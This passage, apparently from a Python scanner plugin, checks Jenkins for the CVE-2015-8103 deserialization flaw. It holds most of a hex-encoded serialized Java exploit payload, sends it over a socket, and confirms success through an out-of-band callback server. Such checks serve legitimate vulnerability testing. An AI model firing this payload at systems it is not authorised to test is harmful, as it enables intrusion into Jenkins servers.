\x00\x08\x43\x4c\x49\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x74\x00\x1f\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x74\x00\x19\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x2e\x6a\x61\x76\x61\x74\x00\x07\x63\x6f\x6e\x6e\x65\x63\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2a\x71\x00\x7e\x00\x2b\x74\x00\x05\x5f\x6d\x61\x69\x6e\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2a\x71\x00\x7e\x00\x2b\x74\x00\x04\x6d\x61\x69\x6e\x73\x72\x00\x26\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x4c\x69\x73\x74\xfc\x0f\x25\x31\xb5\xec\x8e\x10\x02\x00\x01\x4c\x00\x04\x6c\x69\x73\x74\x71\x00\x7e\x00\x0f\x77\x04\xff\xff\xff\xfd\x78\x72\x00\x2c\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x19\x42\x00\x80\xcb\x5e\xf7\x1e\x02\x00\x01\x4c\x00\x01\x63\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x3b\x77\x04\xff\xff\xff\xfd\x78\x70\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x41\x72\x72\x61\x79\x4c\x69\x73\x74\x78\x81\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01\x49\x00\x04\x73\x69\x7a\x65\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x00\x77\x04\x00\x00\x00\x00\x78\x71\x00\x7e\x00\x39\x78\x71\x00\x7e\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x70\x00\x00\x00\x01\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x01\x74\x00\x18\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x6c\x69\x45\x6e\x74\x72\x79\x50\x6f\x69\x6e\x74\x71\x00\x7e\x00\x24\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x01\x74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x74\x00\x1d\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x28\x31\x2c\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x29'
        sock.send(payload)
        time.sleep(5)
        req = urllib2.Request("http://%s:8088/check/%s" % (dnsserver, ramdmum))
        reqopen = urllib2.urlopen(req)
        if 'YES' in reqopen.read():
            return '存在Jenkins反序列化漏洞（CVE-2015-8103）'
    except:
        pass
